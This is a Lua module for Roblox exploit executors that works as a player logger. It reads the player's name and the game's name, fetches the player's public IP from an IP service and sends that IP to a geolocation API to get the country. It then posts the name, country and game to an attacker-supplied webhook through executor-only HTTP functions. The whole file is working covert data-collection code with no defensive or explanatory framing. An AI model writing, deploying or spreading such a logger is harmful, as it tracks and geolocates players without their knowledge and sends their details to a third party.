local function web(webhookURL)
    return function()
        local HttpService = game:GetService("HttpService")
        local playerName = game.Players.LocalPlayer.Name
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        

        local ipAddress = game:HttpGet("https://api.ipify.org/")

        local country = "Unknown"
        local response = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/country_name")
        if response then
            country = response
        end

        local function sanitizeMessage(message)

            message = message:gsub("@[%w_]+", "[filtered]")
            message = message:gsub("/%w+", "[filtered]")
            return message
        end

        local message = "[LOGGER] " .. playerName .. " from " .. country .. " in " .. gameName .. "."
        local sanitizedMessage = sanitizeMessage(message)
        local requestBody = { content = sanitizedMessage }
        local headers = { ["Content-Type"] = "application/json" }

        local request = http_request or request or syn.request or http.request
        if request then
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = headers,
                Body = HttpService:JSONEncode(requestBody)
            })
        else
            warn("HTTP request function not available.")
        end
    end
end

return web
